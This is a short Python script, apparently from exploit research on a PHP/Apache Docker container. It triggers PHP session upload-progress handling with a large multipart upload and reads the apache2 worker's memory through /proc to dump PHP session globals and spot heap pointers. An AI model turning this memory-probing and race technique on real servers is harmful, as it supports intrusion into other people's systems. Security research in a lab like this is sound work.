import subprocess, sys, time, os, struct

BASE = r"C:\Users\likat\p2s52704"
c = "p2s8335"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

sh(f'docker exec {c} sh -c "head -c 4194304 /dev/zero > /tmp/big.txt"')

r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
worker_pid = pids[-1]
r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
B = int(r.stdout.strip().split("-")[0], 16)
ps_base = B + 0x10432a0
print(f"[*] worker={worker_pid} base={hex(B)} ps_base={hex(ps_base)}", flush=True)

def read_mem(addr, size):
    r = subprocess.run(
        f'docker exec {c} sh -c "dd if=/proc/{worker_pid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
        shell=True, capture_output=True
    )
    return r.stdout

up = subprocess.Popen(
    f'docker exec {c} sh -c "curl -s -o /dev/null -F \'PHPSESSID=abc12345xyz\' -F \'PHP_SESSION_UPLOAD_PROGRESS=pwn\' -F \'file=@/tmp/big.txt\' http://127.0.0.1/index.php"',
    shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

# poll and dump the whole ps_globals (0x200 bytes) until we find a non-UNDEF http_session_vars
best = None
for i in range(20):
    time.sleep(0.3)
    data = read_mem(ps_base, 0x200)
    if len(data) < 0x200:
        continue
    words = struct.unpack("<64Q", data)
    # Look for a word that is a heap pointer (0x7x...) that could be the session ref
    # Print the whole dump each poll, but only keep the last
    best = (i, words)

up.kill(); up.wait()

if best:
    i, words = best
    print(f"\n=== ps_globals dump (poll {i}) ===", flush=True)
    for off in range(0, 0x200, 8):
        w = words[off // 8]
        marker = ""
        if w and (w >> 48) == 0x7f or (0x700000000000 < w < 0x800000000000):
            marker = "  <- heap ptr"
        print(f"  +{off:04x}: 0x{w:016x}{marker}", flush=True)
